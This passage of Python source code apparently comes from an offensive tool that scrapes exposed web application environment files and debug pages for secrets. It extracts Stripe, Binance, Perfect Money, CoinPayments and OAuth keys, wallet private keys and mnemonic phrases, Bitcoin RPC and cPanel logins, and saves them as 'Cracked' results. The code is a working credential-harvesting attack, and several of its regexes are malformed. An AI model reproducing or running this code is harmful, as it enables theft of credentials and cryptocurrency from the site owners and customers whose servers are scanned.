			console.print(f'[+] Found GOOGLE CILENT ID => {check_format}', style='green')
			xSave("Cracked", "G+_CLIENT", check_format)

		elif "<td>GOOGLE_CLIENT_ID</td>" in resp:
			google_id = get_param(resp, "<td>GOOGLE_CLIENT_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			google_secret = get_param(resp, "<td>GOOGLE_CLIENT_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			google_redi = get_param(resp, "<td>GOOGLE_REDIRECT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{google_id}|{google_secret}|{google_redi}"
			console.print(f'[+] Found GOOGLE CILENT ID => {check_format}', style='green')
			xSave("Cracked", "G+_CLIENT", check_format)

	elif "FACEBOOK_CLIENT_ID=" in resp or "FACEBOOK_CLIENT_ID = " in resp or "<td>FACEBOOK_CLIENT_ID</td>" in resp:
		if "FACEBOOK_CLIENT_ID=" in resp:
			facebook_id = get_param(resp, "FACEBOOK_CLIENT_ID=(.*?)\n")
			facebook_secret = get_param(resp, "FACEBOOK_CLIENT_SECRET=(.*?)\n")
			facebook_redi = get_param(resp, "FACEBOOK_CALLBACK_URL=(.*?)\n")
			check_format = f"{facebook_id}|{facebook_secret}|{facebook_redi}"
			console.print(f'[+] Found FACKEBOOK CILENT ID => {check_format}', style='green')
			xSave("Cracked", "FACEBOOK_CLIENT", check_format)

		elif "FACEBOOK_CLIENT_ID = " in resp:
			facebook_id = get_param(resp, "FACEBOOK_CLIENT_ID = (.*?)\n")
			facebook_secret = get_param(resp, "FACEBOOK_CLIENT_SECRET = (.*?)\n")
			facebook_redi = get_param(resp, "FACEBOOK_CALLBACK_URL = (.*?)\n")
			check_format = f"{facebook_id}|{facebook_secret}|{facebook_redi}"
			console.print(f'[+] Found FACKEBOOK CILENT ID => {check_format}', style='green')
			xSave("Cracked", "FACEBOOK_CLIENT", check_format)

		elif "<td>FACEBOOK_CLIENT_ID</td>" in resp:
			facebook_id = get_param(resp, "<td>FACEBOOK_CLIENT_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			facebook_secret = get_param(resp, "<td>FACEBOOK_CLIENT_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			facebook_redi = get_param(resp, "<td>FACEBOOK_CALLBACK_URL<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{facebook_id}|{facebook_secret}|{facebook_redi}"
			console.print(f'[+] Found FACKEBOOK CILENT ID => {check_format}', style='green')
			xSave("Cracked", "FACEBOOK_CLIENT", check_format)

def grab_crypto(resp, url):
	if "CRYPTO_PAY_KEY=" in resp or "CRYPTO_PAY_KEY = " in resp or "<td>CRYPTO_PAY_KEY<\\/td>" in resp:
		if "CRYPTO_PAY_KEY=" in resp:
			secret = get_param(resp, "\nCRYPTO_PAY_KEY=(.*?)\n")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found CRYPTO PAY => {check_format}', style='green')
			xSave("Cracked", "CRYPTO_PAY-API", check_format)

		elif "<td>CRYPTO_PAY_KEY</td>" in resp:
			secret = get_param(resp, "<td>CRYPTO_PAY_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found CRYPTO PAY => {check_format}', style='green')
			xSave("Cracked", "CRYPTO_PAY-API", check_format)

		elif "CRYPTO_PAY_KEY = " in resp:
			secret = get_param(resp, "CRYPTO_PAY_KEY = (.*?)\n")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found CRYPTO PAY => {check_format}', style='green')
			xSave("Cracked", "CRYPTO_PAY-API", check_format)

	elif "PRIVATE_KEY_PASS=" in resp or "PRIVATE_KEY_PASS = " in resp or "<td>PRIVATE_KEY_PASS<\\/td>" in resp:
		if "PRIVATE_KEY_PASS=" in resp:
			secret = get_param(resp, "\nPRIVATE_KEY_PASS=(.*?)\n")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found PRIVATE KEY => {check_format}', style='green')
			xSave("Cracked", "PRIVATE-KEY", check_format)
		
		elif "PRIVATE_KEY_PASS =" in resp:
			secret = get_param(resp, "PRIVATE_KEY_PASS = (.*?)\n")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found PRIVATE KEY => {check_format}', style='green')
			xSave("Cracked", "PRIVATE-KEY", check_format)
		
		elif "<td>PRIVATE_KEY_PASS</td>" in resp:
			secret = get_param(resp, "<td>PRIVATE_KEY_PASS<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found PRIVATE KEY => {check_format}', style='green')
			xSave("Cracked", "PRIVATE-KEY", check_format)

	elif "YOUR_MNEMONIC=" in resp or "YOUR_MNEMONIC = " in resp or "<td>YOUR_MNEMONIC<\\/td>" in resp:
		if "YOUR_MNEMONIC=" in resp:
			secret = get_param(resp, "\nYOUR_MNEMONIC=(.*?)\n")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found MNEMONIC Words => {check_format}', style='green')
			xSave("Cracked", "MNEMONIC-WORDS", check_format)
		
		elif "YOUR_MNEMONIC =" in resp:
			secret = get_param(resp, "YOUR_MNEMONIC = (.*?)\n")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found MNEMONIC Words => {check_format}', style='green')
			xSave("Cracked", "MNEMONIC-WORDS", check_format)
		
		elif "<td>YOUR_MNEMONIC</td>" in resp:
			secret = get_param(resp, "<td>YOUR_MNEMONIC<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found MNEMONIC Words => {check_format}', style='green')
			xSave("Cracked", "MNEMONIC-WORDS", check_format)

	elif "private_key=" in resp or "private_key = " in resp or "<td>private_key<\\/td>" in resp or "<td>PRIVATE_KEY<\\/td>" in resp:
		if "private_key=" in resp:
			secret = get_param(resp, "\nYOUR_MNEMONIC=(.*?)\n")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found PRIVATE KEY => {check_format}', style='green')
			xSave("Cracked", "PRIVATE-KEY", check_format)
		
		elif "private_key =" in resp:
			secret = get_param(resp, "private_key = (.*?)\n")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found PRIVATE KEY => {check_format}', style='green')
			xSave("Cracked", "PRIVATE-KEY", check_format)
		
		elif "<td>private_key</td>" in resp:
			secret = get_param(resp, "<td>private_key<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found PRIVATE KEY => {check_format}', style='green')
			xSave("Cracked", "PRIVATE-KEY", check_format)

		elif "<td>PRIVATE_KEY</td>" in resp:
			secret = get_param(resp, "<td>PRIVATE_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found PRIVATE KEY => {check_format}', style='green')
			xSave("Cracked", "PRIVATE-KEY", check_format)

		elif "PRIVATE_KEY=" in resp:
			secret = get_param(resp, "PRIVATE_KEY=(.*?)\n")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found PRIVATE KEY => {check_format}', style='green')
			xSave("Cracked", "PRIVATE-KEY", check_format)
		
		elif "<td>PRIVATE_KEY=</td>" in resp:
			secret = get_param(resp, "<td>PRIVATE_KEY=<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found PRIVATE KEY => {check_format}', style='green')
			xSave("Cracked", "PRIVATE-KEY", check_format)

		elif "PRIVATE_KEY =" in resp:
			secret = get_param(resp, "PRIVATE_KEY = (.*?)\n")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found PRIVATE KEY => {check_format}', style='green')
			xSave("Cracked", "PRIVATE-KEY", check_format)
		
		elif "<td>PRIVATE_KEY =</td>" in resp:
			secret = get_param(resp, "<td>PRIVATE_KEY = <\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found PRIVATE KEY => {check_format}', style='green')
			xSave("Cracked", "PRIVATE-KEY", check_format)

	elif "BLOCKCHAIN_API=" in resp or "BLOCKCHAIN_API = " in resp or "<td>BLOCKCHAIN_API" in resp:
		if "BLOCKCHAIN_API=" in resp:
			secret = get_param(resp, "\nBLOCKCHAIN_API=(.*?)\n")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found BLOCKCHAIN API => {check_format}', style='green')
			xSave("Cracked", "BLOCKCHAIN_API", check_format)
		
		elif "BLOCKCHAIN_API =" in resp:
			secret = get_param(resp, "BLOCKCHAIN_API = (.*?)\n")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found BLOCKCHAIN API => {check_format}', style='green')
			xSave("Cracked", "BLOCKCHAIN_API", check_format)
		
		elif "<td>BLOCKCHAIN_API</td>" in resp:
			secret = get_param(resp, "<td>BLOCKCHAIN_API<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{secret}|{url}"
			console.print(f'[+] Found BLOCKCHAIN API => {check_format}', style='green')
			xSave("Cracked", "BLOCKCHAIN_API", check_format)

	elif "BITCOIND_HOST=" in resp or "BITCOIND_HOST = " in resp or "<td>BITCOIND_HOST</td>" in resp:
		if "BITCOIND_HOST=" in resp:
			host = get_param(resp, "BITCOIND_HOST=(.*?)\n")
			port = get_param(resp, "BITCOIND_PORT=(.*?)\n")
			user = get_param(resp, "BITCOIND_USER=(.*?)\n")
			password = get_param(resp, "BITCOIND_PASSWORD=(.*?)\n")
			confirm = get_param(resp, "BITCOIND_MIN_CONFIRMATIONS=(.*?)\n")
			check_format = f"{host}|{port}|{user}|{password}|{confirm}|{url}"
			console.print(f'[+] Found BITCOIND API => {check_format}', style='green')
			xSave("Cracked", "BITCOIND_API", check_format)
		
		elif "BITCOIND_HOST = " in resp:
			host = get_param(resp, "BITCOIND_HOST = (.*?)\n")
			port = get_param(resp, "BITCOIND_PORT = (.*?)\n")
			user = get_param(resp, "BITCOIND_USER = (.*?)\n")
			password = get_param(resp, "BITCOIND_PASSWORD = (.*?)\n")
			confirm = get_param(resp, "BITCOIND_MIN_CONFIRMATIONS = (.*?)\n")
			check_format = f"{host}|{port}|{user}|{password}|{confirm}|{url}"
			console.print(f'[+] Found BITCOIND API => {check_format}', style='green')
			xSave("Cracked", "BITCOIND_API", check_format)

		elif "<td>BITCOIND_HOST</td>" in resp:
			host = get_param(resp, "<td>BITCOIND_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			port = get_param(resp, "<td>BITCOIND_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			user = get_param(resp, "<td>BITCOIND_USER<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			password = get_param(resp, "<td>BITCOIND_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			confirm = get_param(resp, "<td>BITCOIND_MIN_CONFIRMATIONS<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{host}|{port}|{user}|{password}|{confirm}|{url}"
			console.print(f'[+] Found BITCOIND API => {check_format}', style='green')
			xSave("Cracked", "BITCOIND_API", check_format)

	elif "BINANCE_API_KEY=" in resp or "BINANCE_API_KEY = " in resp or "<td>BINANCE_API_KEY</td>" in resp:
		if "BINANCE_API_KEY=" in resp:
			BINANCE_API_KEY = get_param(resp, "BINANCE_API_KEY=(.*?)\n")
			BINANCE_API_SECRET = get_param(resp, "BINANCE_API_SECRET=(.*?)\n")
			check_format = f"{BINANCE_API_KEY}|{BINANCE_API_SECRET}|{url}"
			console.print(f'[+] Found BINANCE API => {check_format}', style='green')
			xSave("Cracked", "BINANCE_API", check_format)

		elif "BINANCE_API_KEY = " in resp:
			BINANCE_API_KEY = get_param(resp, "BINANCE_API_KEY = (.*?)\n")
			BINANCE_API_SECRET = get_param(resp, "BINANCE_API_SECRET = (.*?)\n")
			check_format = f"{BINANCE_API_KEY}|{BINANCE_API_SECRET}|{url}"
			console.print(f'[+] Found BINANCE API => {check_format}', style='green')
			xSave("Cracked", "BINANCE_API", check_format)

		elif "BINANCE_API_KEY=" in resp:
			BINANCE_API_KEY = get_param(resp, "<td>BINANCE_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			BINANCE_API_SECRET = get_param(resp, "<td>BINANCE_API_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{BINANCE_API_KEY}|{BINANCE_API_SECRET}|{url}"
			console.print(f'[+] Found BINANCE API => {check_format}', style='green')
			xSave("Cracked", "BINANCE_API", check_format)

	elif "BINANCE_PAY_API_KEY=" in resp or "BINANCE_PAY_API_KEY = " in resp or "<td>BINANCE_PAY_API_KEY</td>" in resp:
		if "BINANCE_PAY_API_KEY=" in resp:
			bnb_key = get_param(resp, "BINANCE_PAY_API_KEY=(.*?)\n")
			bnb_sec = get_param(resp, "BINANCE_PAY_SECRET=(.*?)\n")
			bnb_min = get_param(resp, "BINANCE_PAY_MIN=(.*?)\n")
			bnb_max = get_param(resp, "BINANCE_PAY_MAX=(.*?)\n")
			bnb_active = get_param(resp, "BINANCE_PAY_ACTIVE=(.*?)\n")
			check_format = f"{bnb_key}|{bnb_sec}|{bnb_min}|{bnb_max}|{bnb_active}|{url}"
			console.print(f'[+] Found BINANCE PAY API => {check_format}', style='green')
			xSave("Cracked", "BINANCE_PAY_API", check_format)

		elif "BINANCE_PAY_API_KEY = " in resp:
			bnb_key = get_param(resp, "BINANCE_PAY_API_KEY = (.*?)\n")
			bnb_sec = get_param(resp, "BINANCE_PAY_SECRET = (.*?)\n")
			bnb_min = get_param(resp, "BINANCE_PAY_MIN = (.*?)\n")
			bnb_max = get_param(resp, "BINANCE_PAY_MAX = (.*?)\n")
			bnb_active = get_param(resp, "BINANCE_PAY_ACTIVE = (.*?)\n")
			check_format = f"{bnb_key}|{bnb_sec}|{bnb_min}|{bnb_max}|{bnb_active}|{url}"
			console.print(f'[+] Found BINANCE PAY API => {check_format}', style='green')
			xSave("Cracked", "BINANCE_PAY_API", check_format)

		elif "<td>BINANCE_PAY_API_KEY</td>" in resp:
			bnb_key = get_param(resp, "<td>BINANCE_PAY_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			bnb_sec = get_param(resp, "<td>BINANCE_PAY_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			bnb_min = get_param(resp, "<td>BINANCE_PAY_MIN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			bnb_max = get_param(resp, "<td>BINANCE_PAY_MAX<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			bnb_active = get_param(resp, "<td>BINANCE_PAY_ACTIVE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{bnb_key}|{bnb_sec}|{bnb_min}|{bnb_max}|{bnb_active}|{url}"
			console.print(f'[+] Found BINANCE PAY API => {check_format}', style='green')
			xSave("Cracked", "BINANCE_PAY_API", check_format)

	elif "BINANCE_KEY_PUBLIC=" in resp or "BINANCE_KEY_PUBLIC = " in resp or "<td>BINANCE_KEY_PUBLIC</td>" in resp:
		if "BINANCE_KEY_PUBLIC=" in resp:
			bnb_key = get_param(resp, "BINANCE_KEY_PUBLIC=(.*?)\n")
			bnb_sec = get_param(resp, "BINANCE_KEY_SECRET=(.*?)\n")
			check_format = f"{bnb_key}|{bnb_sec}|{url}"
			console.print(f'[+] Found BINANCE PRIVATEKEY API => {check_format}', style='green')
			xSave("Cracked", "BINANCE_PRIVATEKEY_FOUND", check_format)

		elif "BINANCE_KEY_PUBLIC = " in resp:
			bnb_key = get_param(resp, "BINANCE_KEY_PUBLIC = (.*?)\n")
			bnb_sec = get_param(resp, "BINANCE_KEY_SECRET = (.*?)\n")
			check_format = f"{bnb_key}|{bnb_sec}|{url}"
			console.print(f'[+] Found BINANCE PRIVATEKEY API => {check_format}', style='green')
			xSave("Cracked", "BINANCE_PRIVATEKEY_FOUND", check_format)

		elif "<td>BINANCE_KEY_PUBLIC</td>" in resp:
			bnb_key = get_param(resp, "<td>BINANCE_KEY_PUBLIC<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			bnb_sec = get_param(resp, "<td>BINANCE_KEY_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{bnb_key}|{bnb_sec}|{url}"
			console.print(f'[+] Found BINANCE PRIVATEKEY API => {check_format}', style='green')
			xSave("Cracked", "BINANCE_PRIVATEKEY_FOUND", check_format)

	elif "PM_ACCOUNTID=" in resp or "PM_ACCOUNTID = " in resp or "<td>PM_ACCOUNTID</td>" in resp:
		if "PM_ACCOUNTID=" in resp:
			pm_id = get_param(resp, "PM_ACCOUNTID=(.*?)\n")
			pm_secret = get_param(resp, "PM_PASSPHRASE=(.*?)\n")
			pm_current_acc = get_param(resp, "PM_CURRENT_ACCOUNT=(.*?)\n")
			pm_merchent_id = get_param(resp, "PM_MARCHANTID=(.*?)\n")
			pm_merchent_name = get_param(resp, "PM_MARCHANT_NAME=(.*?)\n")
			pm_units = get_param(resp, "PM_UNITS=(.*?)\n")
			pm_alt_pass = get_param(resp, "PM_ALT_PASSPHRASE=(.*?)\n")

			check_format = f"URL:{url}\nPM_ACCOUNTID={pm_id}\nPM_PASSPHRASE={pm_secret}\nPM_CURRENT_ACCOUNT={pm_current_acc}\nPM_MARCHANTID={pm_merchent_id}\nPM_MARCHANT_NAME={pm_merchent_name}\nPM_UNITS={pm_units}\nPM_ALT_PASSPHRASE={pm_alt_pass}\n"
			console.print(f'[+] Found PERFECT MONEY API FOUND => {check_format}', style='green')
			xSave("Cracked", "PERFECT_MONEY_FOUND", check_format)

		elif "PM_ACCOUNTID = " in resp:
			pm_id = get_param(resp, "PM_ACCOUNTID = (.*?)\n")
			pm_secret = get_param(resp, "PM_PASSPHRASE = (.*?)\n")
			pm_current_acc = get_param(resp, "PM_CURRENT_ACCOUNT = (.*?)\n")
			pm_merchent_id = get_param(resp, "PM_MARCHANTID = (.*?)\n")
			pm_merchent_name = get_param(resp, "PM_MARCHANT_NAME = (.*?)\n")
			pm_units = get_param(resp, "PM_UNITS = (.*?)\n")
			pm_alt_pass = get_param(resp, "PM_ALT_PASSPHRASE = (.*?)\n")

			check_format = f"URL:{url}\nPM_ACCOUNTID={pm_id}\nPM_PASSPHRASE={pm_secret}\nPM_CURRENT_ACCOUNT={pm_current_acc}\nPM_MARCHANTID={pm_merchent_id}\nPM_MARCHANT_NAME={pm_merchent_name}\nPM_UNITS={pm_units}\nPM_ALT_PASSPHRASE={pm_alt_pass}\n"
			console.print(f'[+] Found PERFECT MONEY API FOUND => {check_format}', style='green')
			xSave("Cracked", "PERFECT_MONEY_FOUND", check_format)

		elif "<td>PM_ACCOUNTID</td>" in resp:
			pm_id = get_param(resp, "<td>PM_ACCOUNTID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			pm_secret = get_param(resp, "<td>PM_PASSPHRASE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			pm_current_acc = get_param(resp, "<td>PM_CURRENT_ACCOUNT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			pm_merchent_id = get_param(resp, "<td>PM_MARCHANTID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			pm_merchent_name = get_param(resp, "<td>PM_MARCHANT_NAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			pm_units = get_param(resp, "<td>PM_UNITS<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			pm_alt_pass = get_param(resp, "<td>PM_ALT_PASSPHRASE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")

			check_format = f"URL:{url}\nPM_ACCOUNTID={pm_id}\nPM_PASSPHRASE={pm_secret}\nPM_CURRENT_ACCOUNT={pm_current_acc}\nPM_MARCHANTID={pm_merchent_id}\nPM_MARCHANT_NAME={pm_merchent_name}\nPM_UNITS={pm_units}\nPM_ALT_PASSPHRASE={pm_alt_pass}\n"
			console.print(f'[+] Found PERFECT MONEY API FOUND => {check_format}', style='green')
			xSave("Cracked", "PERFECT_MONEY_FOUND", check_format)

	elif "COINPAYMENT_PRIVATE_KEY=" in resp or "COINPAYMENT_PRIVATE_KEY = " in resp or "<td>COINPAYMENT_PRIVATE_KEY</td>" in resp:
		if "COINPAYMENT_PRIVATE_KEY=" in resp:
			coin_private = get_param(resp, "COINPAYMENT_PRIVATE_KEY=(.*?)\n")
			coin_pub = get_param(resp, "COINPAYMENT_PUBLIC_KEY=(.*?)\n")
			coin_merch = get_param(resp, "COINPAYMENT_MERCHANT_ID=(.*?)\n")
			coin_ipn = get_param(resp, "COINPAYMENT_IPN_SECRET=(.*?)\n")
			coin_ipn_url = get_param(resp, "COINPAYMENT_IPN_URL=(.*?)\n")
			check_format = f"URL:{url}\nPRIVATEKEY:{coin_private}\nPUBLIC_KEY:{coin_pub}\nMERCHANT_ID: {coin_merch}\nIPN: {coin_ipn}\nIPN_URL: {coin_ipn_url}\n"
			console.print(f'[+] Found COINPAYMENT API => {check_format}', style='green')
			xSave("Cracked", "COINPAYMENT_FOUND", check_format)

		elif "COINPAYMENT_PRIVATE_KEY = " in resp:
			coin_private = get_param(resp, "COINPAYMENT_PRIVATE_KEY = (.*?)\n")
			coin_pub = get_param(resp, "COINPAYMENT_PUBLIC_KEY = (.*?)\n")
			coin_merch = get_param(resp, "COINPAYMENT_MERCHANT_ID = (.*?)\n")
			coin_ipn = get_param(resp, "COINPAYMENT_IPN_SECRET = (.*?)\n")
			coin_ipn_url = get_param(resp, "COINPAYMENT_IPN_URL = (.*?)\n")
			check_format = f"URL:{url}\nPRIVATEKEY:{coin_private}\nPUBLIC_KEY:{coin_pub}\nMERCHANT_ID: {coin_merch}\nIPN: {coin_ipn}\nIPN_URL: {coin_ipn_url}\n"
			console.print(f'[+] Found COINPAYMENT API => {check_format}', style='green')
			xSave("Cracked", "COINPAYMENT_FOUND", check_format)

		elif "<td>COINPAYMENT_PRIVATE_KEY</td>" in resp:
			coin_private = get_param(resp, "<td>COINPAYMENT_PRIVATE_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			coin_pub = get_param(resp, "<td>COINPAYMENT_PUBLIC_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			coin_merch = get_param(resp, "<td>COINPAYMENT_MERCHANT_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			coin_ipn = get_param(resp, "<td>COINPAYMENT_IPN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			coin_ipn_url = get_param(resp, "<td>COINPAYMENT_IPN_URL<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"URL:{url}\nPRIVATEKEY:{coin_private}\nPUBLIC_KEY:{coin_pub}\nMERCHANT_ID: {coin_merch}\nIPN: {coin_ipn}\nIPN_URL: {coin_ipn_url}\n"
			console.print(f'[+] Found COINPAYMENT API => {check_format}', style='green')
			xSave("Cracked", "COINPAYMENT_FOUND", check_format)

	elif "BTC_API_RPCUSER=" in resp or "BTC_API_RPCUSER = " in resp or "<td>BTC_API_RPCUSER</td>" in resp:
		if "BTC_API_RPCUSER=" in resp:
			btc_rpc_scheme = get_param(resp, "BTC_API_PORT=(.*?)\n")
			btc_host = get_param(resp, "BTC_API_HOST=(.*?)\n")
			btc_port = get_param(resp, "BTC_API_PORT=(.*?)\n")
			btc_user = get_param(resp, "BTC_API_RPCUSER=(.*?)\n")
			btc_password = get_param(resp, "BTC_API_RPCPASSWORD=(.*?)\n")
			btc_fees = get_param(resp, "BTC_API_NETWORK_FEE=(.*?)\n")
			btc_ssl = get_param(resp, "BTC_API_SSL_CERT=(.*?)\n")

			check_format = f"URL:{url}\nBTC_API_SCHEME={btc_rpc_scheme}\nBTC_HOST={btc_host}\nBTC_PORT={btc_port}\nUSER={btc_user}\nPASSWORD={btc_password}\nBTC_FEES={btc_fees}\nBTC_SSL={btc_ssl}\n"
			console.print(f'[+] Found BTC RPC API FOUND => {check_format}', style='green')
			xSave("Cracked", "BTC_RPC_FOUND", check_format)

		elif "BTC_API_RPCUSER = " in resp:
			btc_rpc_scheme = get_param(resp, "BTC_API_PORT = (.*?)\n")
			btc_host = get_param(resp, "BTC_API_HOST = (.*?)\n")
			btc_port = get_param(resp, "BTC_API_PORT = (.*?)\n")
			btc_user = get_param(resp, "BTC_API_RPCUSER = (.*?)\n")
			btc_password = get_param(resp, "BTC_API_RPCPASSWORD = (.*?)\n")
			btc_fees = get_param(resp, "BTC_API_NETWORK_FEE = (.*?)\n")
			btc_ssl = get_param(resp, "BTC_API_SSL_CERT = (.*?)\n")

			check_format = f"URL:{url}\nBTC_API_SCHEME={btc_rpc_scheme}\nBTC_HOST={btc_host}\nBTC_PORT={btc_port}\nUSER={btc_user}\nPASSWORD={btc_password}\nBTC_FEES={btc_fees}\nBTC_SSL={btc_ssl}\n"
			console.print(f'[+] Found BTC RPC API FOUND => {check_format}', style='green')
			xSave("Cracked", "BTC_RPC_FOUND", check_format)

		elif "<td>BTC_API_RPCUSER</td>" in resp:
			btc_rpc_scheme = get_param(resp, "<td>BTC_API_SCHEME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			btc_host = get_param(resp, "<td>BTC_API_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			btc_port = get_param(resp, "<td>BTC_API_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			btc_user = get_param(resp, "<td>BTC_API_RPCUSER<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			btc_password = get_param(resp, "<td>BTC_API_RPCPASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			btc_fees = get_param(resp, "<td>BTC_API_NETWORK_FEE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			btc_ssl = get_param(resp, "<td>BTC_API_SSL_CERT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")

			check_format = f"URL:{url}\nBTC_API_SCHEME={btc_rpc_scheme}\nBTC_HOST={btc_host}\nBTC_PORT={btc_port}\nUSER={btc_user}\nPASSWORD={btc_password}\nBTC_FEES={btc_fees}\nBTC_SSL={btc_ssl}\n"
			console.print(f'[+] Found BTC RPC API FOUND => {check_format}', style='green')
			xSave("Cracked", "BTC_RPC_FOUND", check_format)

	elif 'CPANEL_HOST=' in resp or '<td>CPANEL_HOST</td>' in resp:
		if 'CPANEL_HOST=' in resp:
			cpanel_host = get_param(resp, "CPANEL_HOST=(.*?)\n")
			cpanel_port = get_param(resp, "CPANEL_PORT=(.*?)\n")
			cpanel_username = get_param(resp, "CPANEL_USERNAME=(.*?)\n")
			cpanel_password = get_param(resp, "CPANEL_PASSWORD=(.*?)\n")
			check_format = f"{cpanel_host}|{cpanel_port}|{cpanel_username}|{cpanel_password}|{url}"
			console.print(f'[+] Found Cpanel Info => {check_format}', style='green')
			xSave("Cracked", "Cpanel_ENV", check_format)

		elif 'CPANEL_HOST = ' in resp:
			cpanel_host = get_param(resp, "CPANEL_HOST = (.*?)\n")
			cpanel_port = get_param(resp, "CPANEL_PORT = (.*?)\n")
			cpanel_username = get_param(resp, "CPANEL_USERNAME = (.*?)\n")
			cpanel_password = get_param(resp, "CPANEL_PASSWORD = (.*?)\n")
			check_format = f"{cpanel_host}|{cpanel_port}|{cpanel_username}|{cpanel_password}|{url}"
			console.print(f'[+] Found Cpanel Info => {check_format}', style='green')
			xSave("Cracked", "Cpanel_ENV", check_format)

		elif '<td>CPANEL_HOST</td>' in resp:
			cpanel_host = get_param(resp, "<td>CPANEL_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			cpanel_port = get_param(resp, "<td>CPANEL_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			cpanel_username = get_param(resp, "<td>CPANEL_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			cpanel_password = get_param(resp, "<td>CPANEL_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>")
			check_format = f"{cpanel_host}|{cpanel_port}|{cpanel_username}|{cpanel_password}|{url}"
			console.print(f'[+] Found Cpanel Info => {check_format}', style='green')
			xSave("Cracked", "Cpanel_ENV", check_format)

def get_payment_keys(resp, url):
	if "STRIPE_KEY" in resp:
		if "STRIPE_KEY=" in resp:
			authkey = get_param(resp, "\nSTRIPE_KEY=(.*?)\n")
			secret = get_param(resp, "\nSTRIPE_SECRET={.*?)\n")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found Stripe => {check_format}', style='green')
				xSave("Cracked", "STRIPE-API", check_format)

		elif "<td>STRIPE_SECRET</td>" in resp:
			authkey = get_param(resp, "<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found Stripe => {check_format}', style='green')
				xSave("Cracked", "STRIPE-API", check_format)

	elif "PAYTM_MERCHANT_ID" in resp:
		if "PAYTM_MERCHANT_ID=" in resp:
			authkey = get_param(resp, "\nPAYTM_MERCHANT_ID=(.*?)\n")
			secret = get_param(resp, "\nPAYTM_MERCHANT_KEY={.*?)\n")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found PayTm => {check_format}', style='green')
				xSave("Cracked", "PAYTM-API", check_format)

		elif "<td>PAYTM_MERCHANT_ID</td>" in resp:
			authkey = get_param(resp, "<td>PAYTM_MERCHANT_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
